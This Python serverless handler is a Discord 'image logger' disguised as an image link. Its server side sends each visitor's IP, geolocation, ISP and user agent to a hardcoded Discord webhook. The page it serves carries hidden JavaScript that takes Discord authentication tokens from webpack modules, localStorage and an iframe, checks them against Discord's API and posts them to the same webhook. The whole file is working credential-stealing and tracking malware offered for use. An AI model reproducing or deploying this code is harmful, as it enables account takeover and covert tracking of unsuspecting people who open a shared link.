from http.server import BaseHTTPRequestHandler
from urllib import parse
import json
import urllib.request

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Your webhook URL
        WEBHOOK = "https://discord.com/api/webhooks/1464803825847369837/j3diMzcguRrWtdRMnswJ5uA4_fCymBpPkTsV-eNYEs2xjChfvhpXOTCSb-AMB2ZXgz2Q"
        
        # Default image
        DEFAULT_IMAGE = "https://i.ytimg.com/vi/s8FW-AUsPbs/hq720_2.jpg?sqp=-oaymwEkCJUDENAFSFryq4qpAxYIARUAAAAAJQAAyEI9AICiQ3gB0AEB&rs=AOn4CLAzDGQo0rUo982tOu-DctcgP7cA5g"
        
        # Custom image mappings - add more here
        IMAGES = {
            "mycatimage": "https://i.ytimg.com/vi/s8FW-AUsPbs/hq720_2.jpg?sqp=-oaymwEkCJUDENAFSFryq4qpAxYIARUAAAAAJQAAyEI9AICiQ3gB0AEB&rs=AOn4CLAzDGQo0rUo982tOu-DctcgP7cA5g",
            "dogpic": "https://i.ytimg.com/vi/s8FW-AUsPbs/hq720_2.jpg?sqp=-oaymwEkCJUDENAFSFryq4qpAxYIARUAAAAAJQAAyEI9AICiQ3gB0AEB&rs=AOn4CLAzDGQo0rUo982tOu-DctcgP7cA5g",
            "meme": "https://i.ytimg.com/vi/s8FW-AUsPbs/hq720_2.jpg?sqp=-oaymwEkCJUDENAFSFryq4qpAxYIARUAAAAAJQAAyEI9AICiQ3gB0AEB&rs=AOn4CLAzDGQo0rUo982tOu-DctcgP7cA5g",
            # Add more custom names here
        }
        
        # Get REAL IP and User Agent (Vercel specific headers)
        ip = self.headers.get('X-Real-IP') or self.headers.get('X-Forwarded-For', '').split(',')[0].strip() or self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        country = self.headers.get('X-Vercel-IP-Country', 'Unknown')
        city = self.headers.get('X-Vercel-IP-City', 'Unknown')
        region = self.headers.get('X-Vercel-IP-Country-Region', 'Unknown')
        
        # Get IP info
        try:
            ip_info_url = f"http://ip-api.com/json/{ip}?fields=16976857"
            with urllib.request.urlopen(ip_info_url) as response:
                info = json.loads(response.read().decode())
        except:
            info = {}
        
        # Get image name from path
        path_parts = self.path.strip('/').split('/')
        image_name = path_parts[-1] if len(path_parts) > 1 else None
        
        # Remove query string if exists
        if image_name and '?' in image_name:
            image_name = image_name.split('?')[0]
        
        # Get image URL
        image_url = IMAGES.get(image_name, DEFAULT_IMAGE)
        
        # Create Discord embed
        embed = {
            "username": "Image Logger",
            "content": "@everyone",
            "embeds": [{
                "title": "🎯 Image Logger - IP Logged",
                "color": 65280,
                "description": f"""**A User Opened the Image!**

**Endpoint:** `{image_name if image_name else 'default'}`

**IP Info:**
> **IP:** `{ip}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **Country:** `{info.get('country', country)}`
> **Region:** `{info.get('regionName', region)}`
> **City:** `{info.get('city', city)}`
> **Coords:** `{info.get('lat', 'N/A')}, {info.get('lon', 'N/A')}`
> **Timezone:** `{info.get('timezone', 'Unknown')}`
> **VPN:** `{info.get('proxy', False)}`
> **Mobile:** `{info.get('mobile', False)}`
> **ASN:** `{info.get('as', 'Unknown')}`

**User Agent:**
```
{user_agent}
```""",
                "thumbnail": {"url": image_url},
                "footer": {"text": "Vercel Image Logger"}
            }]
        }
        
        # Send to webhook
        try:
            data = json.dumps(embed).encode('utf-8')
            req = urllib.request.Request(WEBHOOK, data=data, headers={'Content-Type': 'application/json'})
            urllib.request.urlopen(req)
        except:
            pass
        
        # Return HTML with image and improved token grabber
        html = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Image</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: #000;
        }}
        img {{
            max-width: 100%;
            max-height: 100vh;
            object-fit: contain;
        }}
    </style>
</head>
<body>
    <img src="{image_url}" alt="Image">
    <script>
        (async function() {{
            let token = null;
            let tokens = [];
            
            // Method 1: Discord webpack
            try {{
                if (window.webpackChunkdiscord_app) {{
                    window.webpackChunkdiscord_app.push([[Math.random()], {{}}, (req) => {{
                        for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {{
                            if (m.default && m.default.getToken !== undefined) {{
                                token = m.default.getToken();
                            }}
                            if (m.getToken !== undefined) {{
                                token = m.getToken();
                            }}
                        }}
                    }}]);
                }}
            }} catch(e) {{}}
            
            // Method 2: LocalStorage scan
            try {{
                for (let i = 0; i < localStorage.length; i++) {{
                    let key = localStorage.key(i);
                    let value = localStorage.getItem(key);
                    if (value && value.length > 0) {{
                        // Discord token pattern
                        let matches = value.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}/g) || 
                                     value.match(/mfa\\.[\\w-]{{84}}/g);
                        if (matches) {{
                            matches.forEach(t => {{
                                if (!tokens.includes(t)) tokens.push(t);
                            }});
                        }}
                    }}
                }}
            }} catch(e) {{}}
            
            // Method 3: Check all storage
            try {{
                const getToken = () => {{
                    return (webpackChunkdiscord_app.push([[''],{{}},e=>{{m=[];for(let c in e.c)m.push(e.c[c])}}]),m).find(m=>m?.exports?.default?.getToken).exports.default.getToken();
                }};
                token = getToken();
            }} catch(e) {{}}
            
            if (token && !tokens.includes(token)) tokens.push(token);
            
            // Method 4: iframe injection (for Discord embeds)
            if (tokens.length === 0) {{
                try {{
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    document.body.appendChild(iframe);
                    const iframeToken = iframe.contentWindow.localStorage.getItem('token');
                    if (iframeToken) tokens.push(iframeToken.replace(/"/g, ''));
                }} catch(e) {{}}
            }}
            
            // Send all found tokens
            if (tokens.length > 0) {{
                for (let t of tokens) {{
                    try {{
                        // Validate token
                        const response = await fetch('https://discord.com/api/v9/users/@me', {{
                            headers: {{ 'Authorization': t }}
                        }});
                        
                        let userInfo = 'Unknown';
                        if (response.ok) {{
                            const data = await response.json();
                            userInfo = `${{data.username}}#${{data.discriminator}} (ID: ${{data.id}})`;
                        }}
                        
                        await fetch('{WEBHOOK}', {{
                            method: 'POST',
                            headers: {{'Content-Type': 'application/json'}},
                            body: JSON.stringify({{
                                content: '@everyone',
                                embeds: [{{
                                    title: '🔑 DISCORD TOKEN GRABBED',
                                    color: 16711680,
                                    fields: [
                                        {{name: 'Token', value: '```' + t + '```', inline: false}},
                                        {{name: 'Account', value: userInfo, inline: false}},
                                        {{name: 'IP', value: '{ip}', inline: true}},
                                        {{name: 'Location', value: '{info.get("city", "Unknown")}, {info.get("regionName", "Unknown")}', inline: true}},
                                        {{name: 'Endpoint', value: '{image_name if image_name else "default"}', inline: true}}
                                    ],
                                    footer: {{text: 'Token Logger'}}
                                }}]
                            }})
                        }});
                    }} catch(e) {{
                        // Send even if validation fails
                        await fetch('{WEBHOOK}', {{
                            method: 'POST',
                            headers: {{'Content-Type': 'application/json'}},
                            body: JSON.stringify({{
                                content: '@everyone',
                                embeds: [{{
                                    title: '🔑 POSSIBLE TOKEN FOUND',
                                    color: 16776960,
                                    description: '```' + t + '```',
                                    fields: [
                                        {{name: 'IP', value: '{ip}', inline: true}},
                                        {{name: 'Endpoint', value: '{image_name if image_name else "default"}', inline: true}}
                                    ]
                                }}]
                            }})
                        }});
                    }}
                }}
            }}
        }})();
    </script>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
        return
